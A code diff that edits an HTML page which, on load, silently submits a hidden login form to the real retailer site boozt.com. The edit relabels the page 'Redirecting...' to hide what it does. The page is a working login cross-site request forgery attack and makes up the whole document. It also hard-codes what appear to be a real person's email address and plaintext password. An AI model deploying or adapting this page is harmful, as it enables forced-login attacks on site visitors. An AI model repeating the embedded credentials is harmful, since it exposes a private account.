@@ -1,16 +1,18 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Auto Login Test</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
 </head>
 <body>
-    <form id="csrfTestForm" action="https://www.boozt.com/login" method="POST">
-        <input type="hidden" name="Email" value="iqbalup18@gmail.com">
-        <input type="hidden" name="Password" value="6115Isayevm">
-        <input type="hidden" name="submit" value="Login">
+    <form id="csrfForm" action="https://boozt.com/login" method="POST">
+        <input type="hidden" name="email" value="iqbalup18@gmail.com">
+        <input type="hidden" name="password" value="6115Isayevm">
     </form>
+    
     <script>
-        document.getElementById("csrfTestForm").submit();
+        document.getElementById("csrfForm").submit();
     </script>
 </body>
 </html>
